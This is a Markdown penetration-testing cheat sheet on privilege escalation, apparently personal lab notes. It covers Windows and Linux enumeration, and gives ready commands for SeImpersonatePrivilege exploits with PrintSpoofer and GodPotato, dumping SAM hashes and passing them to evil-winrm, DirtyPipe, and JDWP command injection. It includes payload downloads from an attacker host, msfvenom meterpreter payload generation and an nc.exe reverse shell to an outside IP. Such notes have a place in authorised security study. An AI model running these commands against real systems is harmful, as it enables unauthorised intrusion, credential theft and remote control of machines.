# 04 - Privilege Escalation

Index
- [System Enumeration](#System-Enumeration)
    - [Windows](#Windows)
    - [Linux](#Linux)
- [SeImpersonatePrivilege](#SeImpersonatePrivilege)
    - [Exploit by PrintSpoofer64](#Exploit-by-PrintSpoofer64)
    - [Exploit by GodPotato](#Exploit-by-GodPotato)
- [SeBackupPrivileges](#SeBackupPrivileges)
    - [Exploit by secrets dump](#Exploit-by-secrets-dump)
- [Windows.old directory](#Windows.old-directory)
- [Linux DirtyPipe](#Linux-DirtyPipe)
- [JDWP Java Debug](#JDWP-Java-Debug)

## System Enumeration
### General Info
- Search for:
    - user privileges and system configuration
    - git repository and logs
    - archive file like ZIP, BAK, KDBX (and crack it!)
    - web configuration file (CMS config, DB connection file)
    - enumeration tool output

### Windows
Base commands for Windows:
``` powershell
whoami                                  ## domain\username
whoami /groups                          ## my groups
whoami /priv                            ## user's local privileges
Get-LocalUser                           ## local users list
Get-LocalGroup                          ## local groups list
Get-LocalGroupMember $GROUP_NAME        ## members list
net user $USERNAME                      ## user information
net user /domain                        ## domain user list

systeminfo                              ## OS version, domain config, ...
ipconfig /all                           ## network configuration
route print                             ## local routing table
netstat -nao                            ## acctive connections and listening ports
Get-ChildItem Env:                      ## environment vars -- tips: informations hidden
Get-Process                             ## process list

Get-History                             ## history
(Get-PSReadlineOption).HistorySavePath  ## read the content to access the history
```
Search information in file:
``` powershell
Get-ChildItem -Path c:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path c:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue 
Get-ChildItem -Path c:\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path c:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path c:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path c:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue 
Get-ChildItem -Path c:\ -Include credential* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path c:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path c:\ -Include *.git* -File -Recurse -ErrorAction SilentlyContinue                            ## search for git repo
git log                                                                                                         ## check information in log
git view $LOGID                                                                                                 ## check commit log content
```

Other for Windows:
``` powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ## installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname             ## installed software
```

Tools for Windows:
 - winPEAS.exe
 - Seatbelt.exe

### Linux
Base commands for Linux:
``` bash
id
env
history
cat /etc/passwd                             ## user list
ls -la /home                                ## home
ps ax                                       ## process list
uname -na                                   ## os version
ss -anp                                     ## connections
cat /etc/crontab                            ## main crontab
ls -la /etc/cron*                           ## crontab script
ls -la /etc/sudo*
cat /etc/fstab
find / -writable -type d 2>/dev/null        ## writable dir
find / -perm -u=s -type f 2>/dev/null

find ./ -type f -name "*.txt" 2>/dev/null   ## file by extension
find ./ -type f -name "*.tar" 2>/dev/null   ## file by extension
find ./ -type f -name "*.bak" 2>/dev/null   ## file by extension
find ./ -type f -name "*.zip" 2>/dev/null   ## file by extension
find ./ -type f -name "*.gz" 2>/dev/null    ## file by extension

lsmod
/sbin/modinfo $driver_name
dpkg -l
```

Tools for Linux:
 - unix-privesc-check
 - linpeas

## SeImpersonatePrivilege
### Requirements
- Need access to the target system.
- Verify user's privileges:
``` powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled     ## vulnerable
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Exploit by PrintSpoofer64
PrintSpoofer64.exe can exploit the local system and elevate the privileges.
``` powershell
iwr http://192.168.1.1:8888/PrintSpoofer64.exe -outfile PrintSpoofer64.exe      ## download on target system
.\PrintSpoofer64.exe -i -c powershell.exe                                       ## exploit
```

### Exploit by GodPotato
GodPotato.exe can exploit the local system and run command with elevate privilege. Useful link: https://jlajara.gitlab.io/Potatoes_Windows_Privesc.

Generate a payload and a listester:
``` bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$KALI LPORT=443 -f exe -o payload.exe   ## generate payload
msfconsole                                                                                      ## open msfconsole
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https                 ## set payload
msf6 exploit(multi/handler) > set LHOST $KALI
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

Exploit the system:
``` powershell
iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
./GodPotato.exe -cmd "powershell /c ./payload.exe"                                              ## exploit: open a reverse shell
```
Alternative:
``` powershell
./GodPotato.exe -cmd "./nc.exe -t -e c:\Windows\System32\cmd.exe 192.168.1.1 9999"              ## exploit: nc.exe reverse shell
```

## SeBackupPrivileges
### Exploit by secrets dump
- Need access to the target system.
- Verify user's privileges:
``` powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled    ## vulnerable
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

reg save hklm\sam c:\Temp\sam           ## copy on KALI
reg save hklm\system c:\Temp\system     ## copy on KALI
```

From KALI, use impacket-secretsdump to extract the hashes, evil-winrm to login:
``` bash
impacket-secretsdump -sam sam -system system LOCAL

[*] Target system bootKey: 0x00000000000000000000000000000000
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:00000000000000000000000000000000:00000000000000000000000000000000:::
# user                                             # hash

evil-winrm -i 192.168.1.1 -u Administrator -H 00000000000000000000000000000000
```

## Windows.old directory
TODO

## Linux DirtyPipe
Exploit available on Exploit-DB (https://www.exploit-db.com/exploits/50808)

Output from linpeas.sh:
```
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```

If file with interesting perm. in presents (SUID):
``` bash
./exploit /path/to/suid_binary
./exploit /usr/bin/passwd
```

## JDWP Java Debug
If a Java Application use JDWP is possible to interact and execute command with the user's application:

Scenario:
``` bash
# an application run as root
ps -ef|grep java
root         853       1  0 06:23 ?        00:00:01 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java

# in this case the code in App.java is available, is pobble to interact to the DEBUG with jdwp-shellifier.py https://github.com/hugsy/jdwp-shellifier
# Link: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
./jdwp-shellifier.py -t $target -p 8000 --break-on 'java.lang.String.indexOf' --cmd '$REVERSE_SHELL_CMD'
```

This scenario need an interaction with the application to "invoke" the payload.

